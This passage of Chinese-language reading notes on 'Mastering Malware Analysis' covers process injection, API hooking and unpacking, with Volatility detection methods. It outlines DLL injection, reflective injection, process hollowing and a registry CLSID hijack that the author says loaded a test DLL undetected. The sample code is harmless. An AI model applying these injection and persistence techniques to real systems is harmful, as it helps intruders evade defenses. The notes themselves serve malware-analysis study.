7及以上版本中，不允许向核心Windows进程(如explorer.exe)或其他用户的进程中执行注入。然而，它仍然将代码注入当前用户的浏览器和其他进程。</p><p>这种技术合法的使用在各种终端安全产品中来检测应用程序和为了沙箱的目的（在 <em>Understanding API hooking  ​</em>这一节中将会看到），但是这种技术也被恶意软件作者滥用。</p><p>‍</p><h2 id="为什么进程注入"><a href="#为什么进程注入" class="headerlink" title="为什么进程注入?"></a>为什么进程注入?</h2><p>对于恶意软件作者来说，进程注入的好处</p><ul><li>绕过简单的防火墙（阻止除了浏览器或其他允许的应用程序之外的所有应用程序连接互联网），通过注入代码，malware就能与C&amp;C服务器进行通信</li><li>通过在另一个未监控和未调试的进程中运行恶意代码来逃避调试器和其他动态分析或监视工具</li><li>在被注入代码的进程中Hook APIs，可以对受害者进程的行为提供唯一的控制。</li><li>保持持久性。通过将代码注入到后台进程，恶意软件可以在很少重启的服务器上保持持久性，而且不会在硬盘上留下文件。</li></ul><p>‍</p><h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><h2 id="Windows-supported-DLL注入"><a href="#Windows-supported-DLL注入" class="headerlink" title="Windows-supported DLL注入"></a>Windows-supported DLL注入</h2><p>Windows提供了特殊的注册表项，以便在满足特定条件的每个进程中加载DLL，比如</p><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>​</p><p>该注册表项是恶意软件最常滥用的注册表项之一，用于将DLL代码注入其他进程并保持持久性。这里指定的库与加载user32.dll(主要用于UI的系统库)的每个进程一起加载。其实就是user32.dll会加载这个AppInit_DLLs中指定的DLL</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230227202047-ntu5oou.png" class="" title="image"><p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls</code>​</p><p>此注册表项中列出的库被加载到至少使用以下函数之一的每个进程中</p><ul><li>CreateProcess</li><li>CreateProcessAsUser</li><li>CreateProcessWithLogonW</li><li>CreateProcessWithTokenW</li><li>WinExec</li></ul><p><code>HKEY_CURRENT_USER\Software\Classes&lt;AppName&gt;\shellex\ContextMenuHandlers</code>​</p><p>这个路径加载一个shell扩展(一个DLL文件)，以便向主Windows shell (explorer.exe)添加额外的功能。基本上，它可以被误用来加载恶意软件库作为explorer.exe的扩展。可以轻松地创建和修改此路径，无需任何管理特权。</p><p>原来的</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230228145142-wteh2cb.png" class="" title="image">​<p>新建的</p><p>‍</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230228145808-9ce2vtz.png" class="" title="image">​<p>‍</p><blockquote><p><a href="https://www.4hou.com/posts/M19m">https://www.4hou.com/posts/M19m</a></p><p>HKEY_CLASSES_ROOT树是HKEY_LOCAL_MACHINE和HKEY_CURRENT_USER中的注册表信息的合集。在执行合并时，Windows会给出HKCU树中的优先级。</p><p>也就是说，如果有key存在HKCU中，其优先级就高于HKLM中的相同key，也会最终合并到HKEY_CLASSES_ROOT树中。关于合并的更多说明可参见<a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key">https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key</a>。</p><p>默认情况下，explorer启动时会从HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID{90AA3A4E-1CBA-4233-B8BB-535773D48449}\InProcServer32 key中加载Shell.dll。为了将恶意DLL加载到explorer.exe中，研究人员创建了一个HKCU\Software\Classes\CLSID{90AA3A4E-1CBA-4233-B8BB-535773D48449}\InProcServer32 key，然后将其默认值修改为恶意DLL。</p></blockquote><p>‍</p><p>果然重启explorer.exe后他会加载这个testDll.dll，并且杀毒软件并没有报毒，有点恐怖</p><h2 id="一个简单的DLL注入技术"><a href="#一个简单的DLL注入技术" class="headerlink" title="一个简单的DLL注入技术"></a>一个简单的DLL注入技术</h2><ol><li>找到目标进程</li><li>OpenProcess获得进程句柄</li><li>使用VirtualAllocEx，VirtualAllocExNuma, NtAllocateVirtualMemory或类似的函数分配一段空间用来要注入的DLL的路径，另外一个选项是CreateFileMapping -&gt; MapViewOfFile or CreateSectionEx -&gt; NtCreateSection的方式分配空间</li><li>使用WriteProcessMemory等api将恶意程序DLL的路径写入进程，NtWow64WriteVirtualMemory64，或者借助NtMapViewOfSection。</li><li>使用诸如 CreateRemoteThread / NtCreateThreadEx、SuspendThread -&gt; SetThreadContext -&gt; ResumeThread、QueueUserAPC /NtQueueApcThread 或者甚SetWindowHookEx 等 API 加载并执行这个 DLL，将 LoadLibraryA 的地址作为线程起始地址，将 DLL 路径的地址作为参数。</li></ol><p>‍</p><h1 id="深挖进程注入"><a href="#深挖进程注入" class="headerlink" title="深挖进程注入"></a>深挖进程注入</h1><p>在这一节，我们将覆盖这个中级到高级的进程注入技术，这些技术不会在磁盘上留下任何痕迹，并且可以使无文件恶意软件保持持久性。</p><h2 id="发现目标进程"><a href="#发现目标进程" class="headerlink" title="发现目标进程"></a>发现目标进程</h2><p>利用进程快照（CreateToolhelp32Snapshot）的方式，然后去遍历所有的进程, 比如下面这一段是根据NAME得到PID的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">char</span> * szName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">pe32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line">HANDLE hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnapShot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateToolhelp32Snapshot ERROR CODE: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapShot, &amp;pe32))<span class="comment">//遍历所有的进程 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szName, pe32.szExeFile))<span class="comment">//如果名字相同，即说明找到了，则返回进程的ID</span></span><br><span class="line"><span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe32));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//如果没有找到则返回-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码块注入"><a href="#代码块注入" class="headerlink" title="代码块注入"></a>代码块注入</h2><ol><li>找到目标进程</li><li>在目标进程中准备内存</li><li>复制代码（ShellCode）到目标内存中</li><li>执行CreateRemoteThreadFunc</li></ol><p>跟DLL注入非常的类似，最困难的工作是这个ShellCode的编写（位置独立，PE独立，就是不依赖于环境，在任何地方都能执行的代码）</p><p>（第8章，<em>Handling Exploits and Shellcode</em></p><h2 id="反射性DLL注入"><a href="#反射性DLL注入" class="headerlink" title="反射性DLL注入"></a>反射性DLL注入</h2><p>反射式dll注入技术的优势在于可以使得恶意的dll通过 socket 等方式直接传输到目标进程内存并加载，期间无任何文件落地，安全产品的检测难度大大增加</p><p>Reflective loader 实现思路如下：</p><ol><li>获得被注入进程未解析的 dll 的基地址，即下图第7步所指的 dll。</li><li>获得必要的 dll 句柄和函数为修复导入表做准备。</li><li>分配一块新内存去取解析 dll，并把 pe 头复制到新内存中和将各节复制到新内存中。</li><li>修复导入表和重定向表。</li><li>执行 DllMain() 函数。</li></ol><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230301121843-1o9cge9.png" class="" title="image">​<blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjgzNjA5NQ==&mid=2247514915&idx=1&sn=7924af701a34f8088d56bf6a0a8dd4d5&source=41#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2NjgzNjA5NQ==&amp;mid=2247514915&amp;idx=1&amp;sn=7924af701a34f8088d56bf6a0a8dd4d5&amp;source=41#wechat_redirect</a></p></blockquote><p>更多细节可以在后面的进程注入内存取证技术一节中找到。</p><h2 id="Stuxnet-秘密技术-Process-Hollowing"><a href="#Stuxnet-秘密技术-Process-Hollowing" class="headerlink" title="Stuxnet 秘密技术-Process Hollowing"></a>Stuxnet 秘密技术-Process Hollowing</h2><p>其实就是傀儡进程，或者叫映像劫持，映像替换啥的。</p><p>这种机制完全的将Malware伪装成合法的程序，因为PEB和等效的EPROCESS仍然包含合法进程的信息，这有助于恶意软件绕过防火墙和内存取证工具</p><p>（这里MiniLCTF2022和2023出题都是用的这种技术。具体细节就不写了。。</p><p>‍</p><h1 id="动态分析代码注入"><a href="#动态分析代码注入" class="headerlink" title="动态分析代码注入"></a>动态分析代码注入</h1><h2 id="Debug-it-where-it-is"><a href="#Debug-it-where-it-is" class="headerlink" title="Debug it where it is"></a>Debug it where it is</h2><p>假设进程A要注入ShellCode到进程B中，那么我们就阻止注入，直接在进程A中调试ShellCode, 把EIP指到ShellCode的入口位置即可。</p><p>这种方法只能调试简单的。</p><h2 id="附加到目标进程"><a href="#附加到目标进程" class="headerlink" title="附加到目标进程"></a>附加到目标进程</h2><p>在Malware执行CreateRemoteThread之前，附加到目标进程，或者将CreateRemoteThread的参数改为CREATE_SUSPEND</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateRemoteThread</span>(Process, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibrary, (LPVOID)Memory, CREATE_SUSPENDED, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="处理Process-Hollowing"><a href="#处理Process-Hollowing" class="headerlink" title="处理Process Hollowing"></a>处理Process Hollowing</h2><p>对付这种，就是想办法找到要换的PE文件，可以在一些函数下断点</p><ul><li>WriteProcessMemory</li><li>CreateSection，MapViewOfSection</li></ul><p>通过这样，把要Load的PE单独dump到硬盘上，然后单独运行即可。</p><p>有一些特征来识别PE文件，比如MZ头，This program cannot run in DOS mode 字符串等等</p><p>‍</p><p>‍</p><h1 id="针对进程注入的内存取证技术"><a href="#针对进程注入的内存取证技术" class="headerlink" title="针对进程注入的内存取证技术"></a>针对进程注入的内存取证技术</h1><p>在本节中，我们将了解用于检测不同类型的进程注入的不同技术。将使用<strong>Volatility</strong>来进行。</p><p>‍</p><h2 id="检测代码注入和反射性DLL注入"><a href="#检测代码注入和反射性DLL注入" class="headerlink" title="检测代码注入和反射性DLL注入"></a>检测代码注入和反射性DLL注入</h2><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230301202624-0zlaveg.png" class="" title="image">​<p>对于一个进程的内存，分为3种类型，MAP, IMAGE, PRIVATE</p><ul><li>MAP就是共享的内存</li><li>IMAGE就是一个可执行文件的内存映射</li><li>PRIVATE就是VirtualAlloc申请的这种</li></ul><p>进程虚拟地址空间的页面可能处于以下状态之一。</p><ul><li>Free 进程对这个页面没有权限访问。</li><li>Reserved 这个页面被保留以便未来使用，它没有映射到真实的内存上，但是任何其他内存分配调用都不会占用这个空间，直到它被释放。</li><li>Committed 这个页面已经分配到真实的内存当中。</li></ul><p><strong>检测代码注入和反射性DLL注入的原理</strong>：检测以下几种类型的内存情况，因为并不常见</p><ol><li>有EXECUTE权限的PRIVATE内存</li><li>是READ_WRITE_EXECUTE类型的内存</li></ol><p>‍</p><p>用Volatility,有一个<code>malfind</code>​的命令，可以检测代码注入（回头把Volatility学好了，这个图改为自己试验的图）</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230301204414-3sllqgq.png" class="" title="image"><p>上面这张图是检测到了注入的PE文件在Adobe Reader process中，地址是0X3D0000，通过<code>vaddump</code>​命令, 在我们可以dump这个进程的所有内存。</p><p>该命令使用所谓的虚拟地址描述符(<strong>virtual Address descriptor, vad</strong>)转储进程内的所有内存区域，紧跟该进程的EPROCESS内核对象及其虚拟内存映射(及其等效物理内存页)，虚拟地址描述符只是虚拟内存与其等效物理内存之间的映射器。<code>Vaddump</code>​会将所有的内存区域转储到一个单独的文件中。如下图所示</p><p>‍</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230301210328-0hczk0a.png" class="" title="image"><p>对于注入的PE文件，我们可以使用<code>dlldump</code>​而不是<code>vaddump</code>​将它们转储到磁盘(并重新构造它们的头和节，但不包含导入表)，如下面的截图所示:</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230301210623-j4l0mpx.png" class="" title="image"><h2 id="检测Process-Hollowing"><a href="#检测Process-Hollowing" class="headerlink" title="检测Process Hollowing"></a>检测Process Hollowing</h2><p>当这个恶意程序hollow out这个PE image的时候，Windows去除了内存空间和这个PE程序的何联系，所以，在这个地址处的任何分配变为PRIVATE，而且不代表任何IMAGE</p><p>‍</p><p>这个关系的去除是在EPROCESS结构中的去除而不是PEB的去除</p><p>在Volatility中，有2个命令可以列举加载的模块</p><ul><li>dlllist 从PEB结构体中列举（user mode）（这里其实就是检测那3个链InLoadOrderModuleList、InMemoryOrderModuleList、InInitializationOrderModuleList）</li><li>ldrmodules 从EPROCESS结构体中列举（kernel mode）（这里是检测的VAD，检测Mapped File）</li></ul><blockquote><p><a href="http://akovid.blogspot.com/2014/04/difference-among-dlllistldrmodulesand.html">http://akovid.blogspot.com/2014/04/difference-among-dlllistldrmodulesand.html</a></p></blockquote><p>这两个命令之间的任何结果不匹配都可能表示Hollow Process</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302154322-8d4gm5g.png" class="" title="image"><p>有多个不同类型的不匹配，他们代表不同类型的Process Hollowing</p><ul><li>当应用程序模块未链接到其PE文件时，如图5.14所示，它表示该进程已被挖空，并且恶意软件已加载在同一位置。</li><li>当应用程序模块出现在dlllist结果中，但在ldrmodules结果中根本没有出现时，表示该进程已被挖空，并且恶意软件可能加载在另一个地址。malfind命令可以帮助我们找到新地址或使用vaddump转储该进程中的所有内存区域，并扫描它们以查找PE文件（搜索MZ魔数）。</li><li>当应用程序出现在两个命令的结果中，并与应用程序的PE文件名链接，但两个结果中模块地址不匹配时，表示应用程序并未被挖空，但恶意软件已被注入，并且PEB信息已被篡改以链接到恶意软件而不是合法应用程序PE镜像。</li></ul><p>‍</p><p><em><strong>（上面的第二点和第三点不是很懂, 之后弄清楚了回来补）</strong></em></p><p>‍</p><h2 id="使用HollowFind-插件来检测ProcessHollowing"><a href="#使用HollowFind-插件来检测ProcessHollowing" class="headerlink" title="使用HollowFind 插件来检测ProcessHollowing"></a>使用HollowFind 插件来检测ProcessHollowing</h2><p>有一个名为HollowFind的插件可以组合所有这些命令。它会发现可疑的内存空间或进程被Hollowed-Out的证据，并返回这些结果，如下面的屏幕截图所示</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302170135-jq0el0x.png" class="" title="image"><p>‍</p><p>‍</p><h1 id="理解API-HOOKing"><a href="#理解API-HOOKing" class="headerlink" title="理解API HOOKing"></a>理解API HOOKing</h1><p>API hooking是恶意软件作者常用的技术，它截取Windows API调用以改变命令的输入或输出。它基于我们之前介绍的进程注入技术。</p><p>这种技术允许恶意软件作者完全控制目标进程，从而控制用户与该进程的交互体验，包括浏览器和网页、防病毒应用程序及其扫描文件等。通过控制Windows API，恶意软件作者还可以从进程内存和API参数中捕获敏感信息。由于API hooking被恶意软件作者广泛使用，因此它被合法地用于恶意软件沙箱和旧应用程序的向后兼容性等不同的合法用途。因此，Windows官方支持API hooking，正如我们将在本章后面看到的那样。</p><h2 id="Why-API-hooking"><a href="#Why-API-hooking" class="headerlink" title="Why API hooking?"></a>Why API hooking?</h2><p>有很多原因恶意软件将使用API hooking</p><ul><li><p>隐藏malware存在（rootkits）：为了让恶意软件在用户和反病毒扫描程序面前隐藏它的存在，它可能会钩住以下api:</p><ul><li>Process listing APIs Process32First, Process32Next</li><li>File listing APIs FindFirstFileA and FindNextFileA</li><li>Registry 枚举APIs 例如 RegQueryInfoKey and RegEnumKeyEx</li></ul></li><li><p>Stealing banking details (banking Trojans):  捕获HTTP messages， 注入代码在主页面，抓取发送的username和pin codes，它通常hook下面这些APIs</p><ul><li>wininet.dll: InternetConnectA, HttpSendRequestA, InternetReadFile  ws2_32.dll:WSARecv, WSASend</li><li>Firefox APIs such as PR_Read, PR_Write, and PR_Close.</li></ul></li><li><p>其他使用: HOOK CreateProcessA, CreateProcessAsUserA, and similar APIs植入子进程或者阻止启动进程</p></li></ul><p>‍</p><h2 id="使用API-HOOK"><a href="#使用API-HOOK" class="headerlink" title="使用API HOOK"></a>使用API HOOK</h2><h3 id="Inline-API-hooking"><a href="#Inline-API-hooking" class="headerlink" title="Inline API hooking"></a>Inline API hooking</h3><p>更改参数或者直接更改返回值(直接把eax置0，然后ret)</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302181856-qayfnwv.png" class="" title="image"><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302181953-0j5bjua.png" class="" title="image"><h3 id="Inline-API-hooking-with-a-跳板"><a href="#Inline-API-hooking-with-a-跳板" class="headerlink" title="Inline API hooking with a 跳板"></a>Inline API hooking with a 跳板</h3><p>跳板的内容</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302183052-kxzf6dm.png" class="" title="image"><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302183134-i76grvd.png" class="" title="image"><p>这样的话，在HOOK函数里call跳板，然后到了API函数内部， 在API函数内部最后返回的时候ret, 就又到了HOOK函数了</p><p>这一增加的步骤使恶意软件对API及其输出有了更多的控制，例如，可以将JavaScript代码注入到InternetReadFile、PR_Read，或者API用来窃取凭据或将资金转移到不同的银行账户。</p><h3 id="Inline-API-hooking-with-a-长度反汇编器"><a href="#Inline-API-hooking-with-a-长度反汇编器" class="headerlink" title="Inline API hooking with a 长度反汇编器"></a>Inline API hooking with a 长度反汇编器</h3><p>因为不确定开头有几个字节，可能会导致jmp回来的时候跳转到了指令的中间去了，这样就会导致错误，所以需要一个轻量级的长度反汇编器来记录开头的几个字节。</p><h3 id="检测API-HOOK-用内存取证"><a href="#检测API-HOOK-用内存取证" class="headerlink" title="检测API HOOK 用内存取证"></a>检测API HOOK 用内存取证</h3><p>使用<code>apihooks</code>​命令，这个命令扫描进程库，搜索Hooked APIs(以Jmp开头或者Call开头的这种)</p><img src="/2023/03/03/Mastering_Malware_Analysis_Chapter_5/image-20230302201816-3i8wt6i.png" class="" title="image"><p>可以使用<code>vaddump</code>​dump下来，然后用IDA去分析</p><h1 id="探索IAT-HOOK"><a href="#探索IAT-HOOK" class="headerlink" title="探索IAT HOOK"></a>探索IAT HOOK</h1><p>修改IAT表中的函数地址。</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
            <tag> 进程注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Mastering Malware Analysis》第四章</title>
      <link href="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/"/>
      <url>/2023/02/27/Mastering_Malware_Analysis_Chapter_4/</url>
      
        <content type="html"><![CDATA[<p>Mastering Malware Analysis  Chapter 4</p><h1 id="识别壳"><a href="#识别壳" class="headerlink" title="识别壳"></a>识别壳</h1><ol><li>使用PEID等工具</li><li>看节的名字，比如.UPX0等</li><li>看入口点是不是不在第一个节，壳的一般入口点都在最后几个节中，第一个节的属性通常是READ| WRITE</li><li>看导入表的大小，在加了壳的程序中，导入表一般是非常的小的。</li></ol><h1 id="自动的脱壳"><a href="#自动的脱壳" class="headerlink" title="自动的脱壳"></a>自动的脱壳</h1><ol><li>官方脱壳工具，比如UPX的，但是一般攻击者会修改几个模数使官方的工具无法脱壳，比如，修改了节表名，.UPX0改为其他的名字</li><li>OllyScript，可以对OllyScript写脚本啥的</li><li>通用的脱壳机：比如QuickUnpack（感觉要淘汰了，这个玩意</li><li>仿真（比如unipacker，一个基于Unicorn的引擎）</li><li>内存dumps</li></ol><h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><p>手动脱壳和前面提到的自动脱壳的技术主要的区别是 何时进行内存dump以及dump之后需要干什么。如果我们仅仅执行原始的样本，dump内存，然后希望unpacked的模块也可以获得的话，我们将要面对多个问题。</p><ol><li>运行起来后IAT表都填了真实的数据，需要恢复IAT表，甚至可能处理重定位表等问题。</li><li>哈希值与原始样本不同</li><li>原始的loader可能解包样本到allocated的内存中，然后free了，导致dump的不全</li><li>很容易漏掉一些模块;例如，原来的加载程序可能只解压缩32位或64位平台的示例</li></ol><p>因此，最好的方法就是在original 样本的OEP那里停止，因为他已经Unpack完毕，并且没有继续往下进行，在这种情况下dump修复最好。</p><p>‍</p><h2 id="在执行时的内存断点"><a href="#在执行时的内存断点" class="headerlink" title="在执行时的内存断点"></a>在执行时的内存断点</h2><p>这项技术仅仅适用于 unpack后的程序的imagebase和packed后的程序的Imagebase相同的情况下。正如我们知道的，packed的样本肯定包含original样本的数据，所以unpack后，控制权就是到OEP，然后程序正常执行。我们假设OEP在第一个SECTION，所以，我们设置一个断点在那里。</p><h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><p>将第一个SECTION的属性设置为READ/WRITE,  这样就不可执行了。但是默认情况下，在多个WIndows版本中，它对于非关键进程仍然是可执行的，即使内存权限不包含EXECUTE权限，因此需要开启DEP</p><h3 id="开启DEP"><a href="#开启DEP" class="headerlink" title="开启DEP"></a>开启DEP</h3><p>高级系统设置–&gt;性能–&gt;设置–&gt;数据执行保护</p><img src="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/image-20230225211422-svc17t5.png" class="" title="image"><p>现在，这个类型的断点应该就可以实施了，而且恶意软件将会被阻止在这个节执行，特别是在OEP的位置。</p><h3 id="阻止任何更改内存权限的进一步尝试"><a href="#阻止任何更改内存权限的进一步尝试" class="headerlink" title="阻止任何更改内存权限的进一步尝试"></a>阻止任何更改内存权限的进一步尝试</h3><p>不幸的是，仅仅强制执行DEP是不够的，这个unpacking stub能够容易的绕过这个断点，通过使用<code>VirtualProtect</code>​这个API来改内存权限。可以在这个API下断点进行监控，如果修改的话，直接将参数设置为READONLY或者READ| WRITE即可。</p><h3 id="执行然后到达OEP"><a href="#执行然后到达OEP" class="headerlink" title="执行然后到达OEP"></a>执行然后到达OEP</h3><p>这里理论上会触发Access violation 异常，然后停在那，但是自己测试的时候并没有，而是直接终止了^（暂时不清楚是啥原因）^</p><h2 id="调用堆栈回溯"><a href="#调用堆栈回溯" class="headerlink" title="调用堆栈回溯"></a>调用堆栈回溯</h2><p>就是在程序执行的过程中下断点，然后这个时候程序其实已经执行了一小段了，在这个地方栈回溯一点点的找，就能找到OEP</p><p>在哪个地方下断点？？？ 可以先行为监控下这个程序，比如APIMONITOR，然后在一些API那里下断点(比如 GetModuleFileNameA,<br>GetCommandLineA, CreateFileA, VirtualAlloc, HeapAlloc, and memset), </p><p>（感觉此方法不大实用</p><h2 id="监控为unpacked-代码分配的空间"><a href="#监控为unpacked-代码分配的空间" class="headerlink" title="监控为unpacked 代码分配的空间"></a>监控为unpacked 代码分配的空间</h2><p>这个方法还是很有用的，</p><p>监控一些API，比如</p><ul><li>VirtualAlloc/VirtualAllocEx/VirtualAllocExNuma</li><li> LocalAlloc/GlobalAlloc/HeapAlloc</li><li> RtlAllocateHeap</li></ul><p>如果分配空间很大的话，一般就是解密了，可以在分配空间那个地方下断点</p><p>当然，像UPX这种并没有调用这些API，</p><img src="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/image-20230226122234-bzruknr.png" class="" title="image"><p>那是在加载的时候，操作系统会帮申请， 直接在Write的地方下断点即可</p><h2 id="In-place-unpacking（就地解包？？？）"><a href="#In-place-unpacking（就地解包？？？）" class="headerlink" title="In-place unpacking（就地解包？？？）"></a>In-place unpacking（就地解包？？？）</h2><p>虽然不常见，但可以在示例最初所在的同一节(此节应具有写入|执行权限)或在原始文件的另一节中解密示例。</p><p>这里的意思应该是找到大的加密块，然后找哪个地方对这个加密块进行解密，通过这里，来最终定位到解密完成的地方，然后找到OEP</p><p>‍</p><h2 id="寻找跳转到OEP的指令"><a href="#寻找跳转到OEP的指令" class="headerlink" title="寻找跳转到OEP的指令"></a>寻找跳转到OEP的指令</h2><p>一般最后跳转到OEP都是Jmp过去的，有2种</p><ol><li><p>第一种是编译的时候不知道OEP的位置，所以一般是jmp eax，或jmp 某个寄存器或者jmp某个偏移</p></li><li><p>第二种是编译的时候知道了OEP的位置，但是由于是直接静态看，还没有开始unpack，所以跳转过去的指令肯定是还没有解密的，即很有可能是密文或者直接是全是0，或者未分配</p></li></ol><img src="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/image-20230226155851-1xy19ej.png" class="" title="image"><p>‍</p><img src="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/image-20230226155827-z0us6yh.png" class="" title="image"><p>（原来脱壳还能这样，感觉很有用</p><h2 id="基于栈恢复"><a href="#基于栈恢复" class="headerlink" title="基于栈恢复"></a>基于栈恢复</h2><p>ESP大法脱壳应该就是属于这种</p><p>‍</p><h1 id="DUMP-unpacked的样本并且修复IAT"><a href="#DUMP-unpacked的样本并且修复IAT" class="headerlink" title="DUMP unpacked的样本并且修复IAT"></a>DUMP unpacked的样本并且修复IAT</h1><h2 id="DUMP进程"><a href="#DUMP进程" class="headerlink" title="DUMP进程"></a>DUMP进程</h2><p>可以使用OD的插件，OllyDump</p><p>或者PETools（32）或Lord PE （32）或者VSD（32/64）</p><h2 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h2><p>为什么需要修复导入表？？？</p><p>因为原来的导入表被填充了真实的地址，而这个地址再次加载的话不一定是正确的，所以需要修复导入表。</p><p>IAT的结构</p><img src="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/image-20230226173248-dw5ggfm.png" class="" title="image"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;   </span><br><span class="line">        DWORD Function;           </span><br><span class="line">        DWORD Ordinal;<span class="comment">//序号</span></span><br><span class="line">        DWORD AddressOfData;        <span class="comment">//指向 _IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//可能为空，编译器决定，如果不为空，是函数在导出表中的索引(不是序号)</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];<span class="comment">//函数名称，以0结尾</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了恢复导入表，需要搜寻API地址s，然后用对应的名字或者序号去替换它</p><p>利用ImportREC即可</p><p>对于64位系统，the Scylla or CHimpREC tools can be used instead.</p><h1 id="高级对称和非对称加密算法"><a href="#高级对称和非对称加密算法" class="headerlink" title="高级对称和非对称加密算法"></a>高级对称和非对称加密算法</h1><p>像RC4这种简单的算法，Malware会自己实现它的算法，然而像DES, AES或者RSA这种算法的实现，通常恶意软件作者不会自己去写算法，而是去调用API实现。我们需要做的是识别算法、加密/解密密钥和数据</p><h2 id="从Windows加密APIs提取信息"><a href="#从Windows加密APIs提取信息" class="headerlink" title="从Windows加密APIs提取信息"></a>从Windows加密APIs提取信息</h2><p>一些常用的API用于提供对加密算法的访问，包含DES, AES, RSA甚至是RC4加密，这些APIs是CryptAcquireContext, CryptCreateHash,CryptHashData, CryptEncrypt, CryptDecrypt, CryptImportKey, CryptGenKey,CryptDestroyKey, CryptDestroyHash,, and CryptReleaseContext (来自Advapi32.dll)</p><p>恶意软件如何使用这些API</p><h3 